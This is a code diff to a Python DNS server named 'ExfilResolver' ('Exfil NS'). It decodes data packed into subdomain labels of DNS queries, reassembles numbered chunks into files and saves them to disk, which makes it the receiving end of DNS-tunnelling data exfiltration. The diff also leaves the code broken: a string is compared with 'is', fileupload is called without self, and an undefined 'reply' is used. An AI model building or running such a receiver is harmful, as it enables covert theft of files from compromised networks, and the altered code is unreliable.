@@ -5,7 +5,6 @@ from dnslib import RR,QTYPE,RCODE,TXT,parse_time
 from dnslib.label import DNSLabel
 from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
 
-
 class ExfilResolver(BaseResolver):
     def __init__(self,origin,ttl):
         self.origin = DNSLabel(origin)
@@ -17,10 +16,25 @@ class ExfilResolver(BaseResolver):
         reply = request.reply()
         qname = str(request.q.qname)
 
-        data = qname.split(".")[0]
-        data = data.upper()
+        # Strip the top level domains off to just handle the part relevant to us
+        qname = qname.replace("." + str(self.origin), "") 
+        # print("QNAME:", qname)
+
+        if qname.split(".")[-1] is "fu":
+            return fileupload(qname)
+        
+
+    def fileupload(self, qname):
+        if len(qname.split(".")) != 4:
+            error = "Error: Incorrect amount of subdomains"
+            # reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
+            reply.header.rcode = RCODE.NXDOMAIN
+            return reply
+            
+        data = qname.split(".")[0].upper()
         index = qname.split(".")[1]
         filename = qname.split(".")[2]
+
         if '-' in data: 
             print("New file incoming, lines:", data.split("-")[1])
             self.files.update({filename: [None] * int(data.split("-")[1])})
@@ -35,6 +49,7 @@ class ExfilResolver(BaseResolver):
         reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("This is a reply")))
         return reply
 
+    # Doing this in a seperate thread would be nice
     def checkfile(self, filename):
         # this is one dense line of code
         nones = len([x for x in self.files[filename] if x is None])
@@ -45,6 +60,7 @@ class ExfilResolver(BaseResolver):
                 for x in self.files[filename]: 
                     f.write(x)
             print("File:", filename, "written to disk")
+            # TODO decode the file
             # TODO delete that dictionary entry for mem reasons
                 
         else:
@@ -56,9 +72,9 @@ if __name__ == '__main__':
     import argparse,sys,time
 
     p = argparse.ArgumentParser(description="Exfil NS")
-    p.add_argument("--origin","-o",default=".",
+    p.add_argument("--origin","-o",required=True,
                     metavar="<origin>",
-                    help="Origin domain label (default: .)")
+                    help="Origin domain label (Ex: example.com)")
     args = p.parse_args()
 
     resolver = ExfilResolver(args.origin,"60s")
